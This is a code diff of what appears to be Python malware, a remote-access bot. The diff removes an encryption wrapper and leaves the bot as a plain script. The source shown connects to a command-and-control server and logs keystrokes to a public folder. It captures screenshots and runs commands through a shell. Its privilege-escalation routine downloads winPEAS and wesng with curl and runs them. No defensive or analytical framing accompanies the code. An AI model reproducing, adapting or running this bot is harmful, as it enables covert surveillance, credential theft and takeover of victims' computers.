@@ -1,11 +1,5 @@
-from cryptography.fernet import Fernet
+# bot_payload.py
 
-# Generate a key for encryption
-key = Fernet.generate_key()
-cipher = Fernet(key)
-
-# The full bot's payload (to be encrypted)
-bot_payload = b"""
 import socket
 import subprocess
 import os
@@ -18,7 +12,7 @@ from ctypes import windll
 # Configuration
 SERVER_HOST = '127.0.0.1'
 SERVER_PORT = 9999
-KEYLOG_FILE = "C:\\\\Users\\\\Public\\\\keylogs.txt"
+KEYLOG_FILE = "C:\\Users\\Public\\keylogs.txt"
 ENCRYPTION_KEY = Fernet.generate_key()
 
 # Function to execute system commands
@@ -34,20 +28,20 @@ def privilege_escalation():
     wesng_url = "https://github.com/bitsadmin/wesng/releases/latest/download/wesng.zip"
     winpeas_url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe"
     
-    wesng_file = "C:\\\\Users\\\\Public\\\\wesng.zip"
-    winpeas_file = "C:\\\\Users\\\\Public\\\\winPEASany.exe"
-    wesng_output = "C:\\\\Users\\\\Public\\\\wesng_output.txt"
-    winpeas_output = "C:\\\\Users\\\\Public\\\\winpeas_output.txt"
+    wesng_file = "C:\\Users\\Public\\wesng.zip"
+    winpeas_file = "C:\\Users\\Public\\winPEASany.exe"
+    wesng_output = "C:\\Users\\Public\\wesng_output.txt"
+    winpeas_output = "C:\\Users\\Public\\winpeas_output.txt"
 
     # Download wesng
     subprocess.run(f"curl -L -o {wesng_file} {wesng_url}", shell=True)
-    subprocess.run(f"tar -xf {wesng_file} -C C:\\\\Users\\\\Public\\\\", shell=True)
+    subprocess.run(f"tar -xf {wesng_file} -C C:\\Users\\Public\\", shell=True)
 
     # Download winPEAS
     subprocess.run(f"curl -L -o {winpeas_file} {winpeas_url}", shell=True)
 
     # Run wesng
-    subprocess.run(f"python C:\\\\Users\\\\Public\\\\WES-NG\\wes.py --all > {wesng_output}", shell=True)
+    subprocess.run(f"python C:\\Users\\Public\\WES-NG\\wes.py --all > {wesng_output}", shell=True)
 
     # Run winPEAS
     subprocess.run(f"{winpeas_file} > {winpeas_output}", shell=True)
@@ -81,7 +75,7 @@ def start_keylogger():
 # Function to capture screenshots
 def capture_screenshot():
     screenshot = pyautogui.screenshot()
-    screenshot.save("C:\\\\Users\\\\Public\\\\screenshot.png")
+    screenshot.save("C:\\Users\\Public\\screenshot.png")
     return "Screenshot captured."
 
 # Bot main function to connect to the C&C server
@@ -114,11 +108,3 @@ def connect_to_server():
 
 if __name__ == "__main__":
     connect_to_server()
-"""
-
-# Encrypt the bot payload
-encrypted_payload = cipher.encrypt(bot_payload)
-
-# Write the encrypted payload to a file
-with open("encrypted_payload.bin", "wb") as file:
-    file.write(encrypted_payload)
